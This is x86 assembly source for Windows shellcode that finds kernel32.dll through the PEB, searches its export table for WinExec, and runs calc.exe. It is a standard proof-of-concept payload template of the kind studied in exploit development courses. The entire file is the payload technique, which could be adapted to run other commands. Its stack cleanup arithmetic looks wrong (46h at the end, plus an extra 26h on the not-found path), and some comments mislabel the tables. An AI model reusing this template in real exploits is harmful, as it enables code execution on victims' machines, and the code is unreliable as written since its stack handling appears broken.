;
; kernel32!WinExec("C:\Windows\System32\calc.exe")
;
start:
    ; save all registers
    push eax
    push ebx
    push ecx
    push edx
    push esi
    push edi

    ; Create a new stack frame
    push ebp
    mov ebp, esp
    sub esp, 18h  ; allocate memory for local variables

    ; 0. push "WinExec\x00" to the stack
    xor esi, esi
    push esi
    push 636578h
    push 456e6957h
    mov [ebp-4], esp ; var4 = "WinExec\x00"

    ; Find the DLL base address
    xor esi, esi
    mov ebx, [fs:30h+esi]       ; Get pointer to PEB
    mov ebx, [ebx+0Ch]          ; Get pointer to PEB_LDR_DATA
    mov ebx, [ebx+14h]          ; Get pointer to first entry in InMemOrderModuleList
    mov ebx, [ebx]              ; Get pointer to second entry in InMemOrderMoudleList
    mov ebx, [ebx]              ; Get pointer to third entry in InMemOrderMoudleList (kernel32.dll)
    mov ebx, [ebx+10h]	     	; ebx holds kernel32.dll base address
	mov [ebp-8], ebx 		    ; var8 = kernel32.dll base address

    ; Find the address of  the target function = "WinExec" 

    ;; Get header address
    mov eax, [ebx + 3Ch]   ; Get RVA of PE signature
    add eax, ebx           ; Get address of PE signature = base address + RVA of PE signature (e_lfanew)

    ;; Get Export Directory address
    mov eax, [eax + 78h]   ; Get RVA of Export Directory 
    add eax, ebx           ; Export Directory

    ;; Get Address Table, Name Pointer Table, Ordinal Table
    mov ecx, [eax + 24h]   ; Get RVA of Ordinal Table
    add ecx, ebx           ; Get address of Name Pointer Table
    mov [ebp-0Ch], ecx     ; var12 = address of Ordinal Table

    mov edi, [eax + 20h]   ; Get RVA of Name Pointer Table
    add edi, ebx           ; Get Address of Name Pointer Table
    mov [ebp-10h], edi 	   ; var16 = Address of Name Pointer Table

    mov edx, [eax + 1Ch]   ; Get RVA of Address Table
    add edx, ebx 			     ; Get Address of Address Table
    mov [ebp-14h], edx 	   ; var20 = Address of Address Table

    mov edx, [eax + 14h]   ; Number of exported functions
    xor eax, eax           ; be the index (counter) for loop
    
    ;; Loop to find target function
    .loop:
        mov edi, [ebp - 10h] ; edi = var16 (Address of Name Pointer Table)
        mov esi, [ebp - 4]   ; esi = var4 (The name of target function)  #temp
        xor ecx, ecx
        
        cld                  ; set DF=0 (process strings from left to right)
        mov edi, [edi+eax*4] ; Entries in Name Pointer Table are 4 bytes
                             ; edi = RVA Nth entry = address of Name Table*4 
        add edi, ebx         ; edi = address of string = base address + RVA Nth entry 
        add cx, 8            ; edi = address of strings to compare (len("WinExec") = 8)
        repe cmpsb           ; Compare the first 8 bytes of strings in 
                                ; esi and edi registers. ZF=1 if equal, ZF=0 if not

        jz start.found        
            
        inc eax              ; ++
        cmp eax, edx         ; check if last function is reached
        jb start.loop        ; if not the last function, jump to loop
        
        add esp, 26h        
        jmp start.end        ; if function is not found, jump to end

    .found:
        ; eax holds the position (index) of the target function
        
        mov ecx, [ebp-0Ch]  ; ecx = var12 (Address of Ordinal Table)
        mov edx, [ebp-14h]  ; edx = var20 (Address of Address Table)
        
        mov ax, [ecx+eax*2] ; ax = ordinal number = var12 + (index*2)
        mov eax, [edx+eax*4]; eax = RVA of function = var20 + (ordinal*4)
        add eax, ebx        ; eax = address of the target function
                                                ; = DLL base address + RVA of the target function
        ; WinExec("C:\Windows\System32\calc.exe")
        xor edx, edx
        push edx		; null termination
        push 6578652eh
        push 636c6163h
        push 5c32336dh
        push 65747379h
        push 535c7377h
        push 6f646e69h
        push 575c3a43h
        mov esi, esp    ; esi -> "C:\Windows\System32\calc.exe"

        push 10         ; window state SW_SHOWDEFAULT
        push esi        ; "C:\Windows\System32\calc.exe"
        call eax        ; WinExec
        

    .end:
        add esp, 46h    ; clear the stack
        pop ebp 		; restore all registers and exit
		pop edi
		pop esi
		pop edx
		pop ecx
		pop ebx
		pop eax
		ret

    